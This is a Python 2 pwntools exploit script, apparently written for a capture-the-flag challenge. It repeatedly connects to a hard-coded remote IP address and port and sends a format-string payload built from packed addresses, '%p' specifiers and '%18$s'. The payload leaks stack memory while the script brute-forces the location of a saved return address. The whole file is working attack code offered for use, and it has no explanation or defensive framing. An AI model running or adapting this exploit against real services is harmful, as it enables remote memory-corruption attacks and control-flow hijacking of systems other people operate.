#!/usr/bin/env python

from pwn import *
import re
import time

# START_ADDR  = 0xffffd000
START_ADDR  = 0xffffdabc
# START_ADDR  = 0xffffda8c
END_ADDR    = 0xffffe000

TIMEOUT = 3.0
DELAY = 0.3

RET_ADDR = 0x8048702

def is_payload(r):
    # extract the leaked stack contents
    m = re.search(r"gggg(.*)hhhh", r, re.MULTILINE)

    if m:
        s = m.group(1)

        if len(s) >= 4:
            print "[+] Last 4 bytes: " + str(s)
            print "[+] Last 4 bytes as an addr: " + hex(u32(s[0:4]))
            if s[0] == 'a' and s[1] == 'a' and s[2] == 'a' and s[3] == 'a':
                return True

    return False

def is_ret_addr(r):
    # extract the leaked stack contents
    m = re.search(r"gggg(.*)hhhh", r, re.MULTILINE)

    if m:
        s = m.group(1)

        if len(s) >= 4:
            print "[+] Last 4 bytes: " + str(s)
            print "[+] Last 4 bytes as an addr: " + hex(u32(s[0:4]))
            if s[0] == '\x02' and s[1] == '\x87' and s[2] == '\x04' and s[3] == '\x08':
                return True

    return False

stack_addresses = []
for addr in range(START_ADDR, END_ADDR, 4):
    print "[+] Start addr: " + hex(addr)
    p = remote("35.237.220.217", 1339)

    buf = p32(addr)
    buf += p32(addr + 1)
    buf += p32(addr + 2)
    buf += p32(addr + 3)
    buf += p32(addr)
    buf += p32(addr + 1)
    buf += p32(addr + 2)
    buf += p32(addr + 3)

    buf += "a" * 104
    buf += "%p." * 17
    buf += "g" * 4
    buf += "%18$s"
    buf += "h" * 4
    p.sendline(buf)

    r = p.recvrepeat(TIMEOUT)
    print "[+] Response: " + r
    p.close()

    if is_ret_addr(r) == True:
        print "[+] Found stack address holding the ret addr: " + hex(addr)
        break
        # stack_addresses.append(hex(addr))

    time.sleep(DELAY)

print "[+] Found the following addresses: "
for addr in stack_addresses:
    print "[+] Addr: " + addr
